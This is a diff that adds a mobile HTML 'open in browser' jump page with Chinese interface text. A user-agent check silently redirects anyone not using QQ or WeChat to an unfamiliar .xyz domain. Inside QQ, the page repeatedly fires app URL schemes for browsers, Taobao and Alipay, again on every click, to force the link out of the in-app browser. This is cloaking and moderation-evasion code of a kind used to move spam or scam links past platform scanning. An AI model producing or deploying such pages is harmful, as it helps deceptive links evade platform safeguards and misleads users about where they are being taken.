@@ -1,1 +1,82 @@
-hhhh
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" style="font-size: 100px;">
+<head id="Head1"><meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>点右上角【···】选择浏览器打开</title>
+    <!--禁止全屏缩放-->
+    <meta name="viewport" content="width=device-width,minimum-scale=1.0,maximum-scale=1.0,user-scalable=no" />
+    <!--不显示成手机号-->
+    <meta name="format-detection" content="telephone=no" />
+    <!--删除默认的苹果工具栏和菜单栏-->
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <!--解决UC手机字体变大的问题-->
+    <meta name="wap-font-scale" content="no" />
+    <!--控制状态栏显示样式-->
+     <style type="text/css" media="all">
+    .copy{width: 100%;height:50px;line-height:50px;bottom: 0;position:fixed;text-align:center;background-color: ;color:#0001ff}
+    .
+  </style>
+    <meta name="apple-mobile-web-app-status-bar-style" content="black" />
+    <link href="https://woaqp.cos.mh-shanghai.cssfwl.cn/tz/index.css" rel="stylesheet" type="text/css" />
+    <script type="text/javascript" src="https://woaqp.cos.mh-shanghai.cssfwl.cn/tz/jquery.min.js"></script>
+    <script type="text/javascript">
+$(function ($) {
+    setRootFontSize();
+});
+window.onresize = function () {
+    setRootFontSize();
+}
+function setRootFontSize() {
+    $('html').css('font-size', document.body.clientWidth / 15 + 'px');
+}
+    if (navigator.userAgent.match(/Android/i) && ((/MQQBrowser/i.test(navigator.userAgent) && /QQ/i.test((navigator.userAgent).split('MQQBrowser'))) || /MicroMessenger/i.test(navigator.userAgent))) {
+} else if (navigator.userAgent.match(/iPhone|iPad|iPod/i) && (/ QQ/i.test(navigator.userAgent) || /MicroMessenger/i.test(navigator.userAgent))) {
+} else {
+    window.location.href = 'http://6rpba.xyz/';
+}
+    </script>
+</head>
+<body style="background-color: #F3F3F3;">
+    <div id="Pan_WX">
+        <!--qq访问-->
+        <div class="fc_jt">
+            <img src="https://shp.qpic.cn/collector/291437427/25b04bc6-6ef5-4933-95b1-0ec1b429dfde/0"></div>
+               <div class="fc_wz">
+                点击屏幕右上角【···】<br />
+                使用【浏览器】打开
+            </div>  
+          <div class="fc_tp">
+            <img src="http://store.liebao.cn/admin/extensions/game/screenshot/2171fe1936c684218f5c2ddfa3f7a255.png"></div>
+<a style="display: none;" href="" id="vurl" rel="noreferrer"></a >
+<script>
+function openu(u){
+document.getElementById("vurl").href= u;
+document.getElementById("vurl").click();
+}
+var url = window.location.href;
+        if(navigator.userAgent.indexOf("QQ/")> -1){
+                openu("ucbrowser://"+url);
+                openu("mttbrowser://url="+url);
+                openu("baiduboxapp://browse?url="+url);
+                openu("googlechrome://browse?url="+url);
+                openu("mibrowser:"+url);
+        openu("taobao://"+url.split("://")[1]);
+        openu("alipays://platformapi/startapp?appId=20000067&url="+url);
+                $("html").on("click",function(){
+                        openu("ucbrowser://"+url);
+                        openu("mttbrowser://url="+url);
+                        openu("baiduboxapp://browse?url="+url);
+                        openu("googlechrome://browse?url="+url);
+                        openu("mibrowser:"+url);
+                        openu("taobao://"+url.split("://")[1]);
+            openu("alipays://platformapi/startapp?appId=20000067&url="+url);
+                });
+        }else if(navigator.userAgent.indexOf("MicroMessenger") > -1){
+                if(navigator.userAgent.indexOf("Android") > -1){
+                        var iframe = document.createElement("iframe");
+                        iframe.style.display = "none";
+                        document.body.appendChild(iframe);
+                }else{
+        }
+        }
+</script>
+</html>
